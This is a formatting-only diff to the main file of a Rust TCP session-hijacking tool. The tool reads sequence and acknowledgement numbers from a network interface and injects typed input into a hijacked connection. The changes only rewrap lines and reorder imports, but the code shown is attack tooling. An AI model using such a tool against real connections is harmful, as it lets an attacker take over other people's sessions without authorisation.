@@ -37,7 +37,10 @@ async fn main() -> anyhow::Result<()> {
             1 => tracing::Level::INFO,
             _ => tracing::Level::WARN,
         };
-        tracing_subscriber::fmt().with_max_level(level).with_writer(std::io::stderr).init();
+        tracing_subscriber::fmt()
+            .with_max_level(level)
+            .with_writer(std::io::stderr)
+            .init();
     }
 
     if !args.tui {
@@ -51,8 +54,12 @@ async fn main() -> anyhow::Result<()> {
         eprintln!("[+] Using provided SEQ=0x{:x} ACK=0x{:x}", seq, ack);
         Connection::new(args.src, args.dst, seq, ack)
     } else {
-        let c = net::get_seq_ack(args.interface.clone(),args.src,args.dst).await?;
-        eprintln!("[+] Got SEQ=0x{:x} ACK=0x{:x}", c.get_seq().await, c.get_ack().await);
+        let c = net::get_seq_ack(args.interface.clone(), args.src, args.dst).await?;
+        eprintln!(
+            "[+] Got SEQ=0x{:x} ACK=0x{:x}",
+            c.get_seq().await,
+            c.get_ack().await
+        );
         eprintln!("[+] Connection: {} → {}", c.src, c.dst);
         c
     };
@@ -81,7 +88,9 @@ async fn main() -> anyhow::Result<()> {
         let recv_dst = connection.src;
 
         tokio::spawn(async move {
-            if let Err(e) = run_receiver(&interface,recv_src,recv_dst,injector_conn,pkt_tx).await {
+            if let Err(e) =
+                run_receiver(&interface, recv_src, recv_dst, injector_conn, pkt_tx).await
+            {
                 error!("Receiver error: {}", e);
             }
         });
@@ -94,7 +103,10 @@ async fn main() -> anyhow::Result<()> {
     }
 }
 
-async fn run_headless_mode(injector: Injector,mut pkt_rx: mpsc::Receiver<ParsedPacket>) -> anyhow::Result<()> {
+async fn run_headless_mode(
+    injector: Injector,
+    mut pkt_rx: mpsc::Receiver<ParsedPacket>,
+) -> anyhow::Result<()> {
     eprintln!("[*] Hijack session started. ^D to exit.");
     eprintln!("[*] Everything you type is sent to the hijacked connection.\n");
 
@@ -122,21 +134,33 @@ async fn run_headless_mode(injector: Injector,mut pkt_rx: mpsc::Receiver<ParsedP
     Ok(())
 }
 
-async fn run_tui_mode(injector: Injector, pkt_rx: mpsc::Receiver<ParsedPacket>) -> anyhow::Result<()> {
+async fn run_tui_mode(
+    injector: Injector,
+    pkt_rx: mpsc::Receiver<ParsedPacket>,
+) -> anyhow::Result<()> {
     lyc_tui::run_tui(&injector, pkt_rx).await?;
     injector.finish().await?;
     eprintln!("[*] Session ended.");
     Ok(())
 }
 
-async fn run_receiver(interface: &str,src: std::net::SocketAddr,dst: std::net::SocketAddr, connection: Connection,pkt_tx: mpsc::Sender<ParsedPacket>) -> anyhow::Result<()> {
-    use pnet::datalink::{self, Channel::Ethernet, NetworkInterface};
-    use pktparse::{ethernet, ipv4, tcp};
+async fn run_receiver(
+    interface: &str,
+    src: std::net::SocketAddr,
+    dst: std::net::SocketAddr,
+    connection: Connection,
+    pkt_tx: mpsc::Sender<ParsedPacket>,
+) -> anyhow::Result<()> {
     use pktparse::ip::IPProtocol;
+    use pktparse::{ethernet, ipv4, tcp};
+    use pnet::datalink::{self, Channel::Ethernet, NetworkInterface};
     use std::net::IpAddr;
 
     let interfaces = datalink::interfaces();
-    let iface = interfaces.into_iter().find(|i: &NetworkInterface| i.name == interface).context("Interface not found for receiver")?;
+    let iface = interfaces
+        .into_iter()
+        .find(|i: &NetworkInterface| i.name == interface)
+        .context("Interface not found for receiver")?;
 
     let (_, mut rx) = match datalink::channel(&iface, Default::default()) {
         Ok(Ethernet(_tx, rx)) => (_tx, rx),
@@ -168,7 +192,10 @@ async fn run_receiver(interface: &str,src: std::net::SocketAddr,dst: std::net::S
                         continue;
                     }
 
-                    if connection.is_duplicate(tcp_hdr.sequence_no, remaining.len() as u32).await {
+                    if connection
+                        .is_duplicate(tcp_hdr.sequence_no, remaining.len() as u32)
+                        .await
+                    {
                         continue;
                     }
 
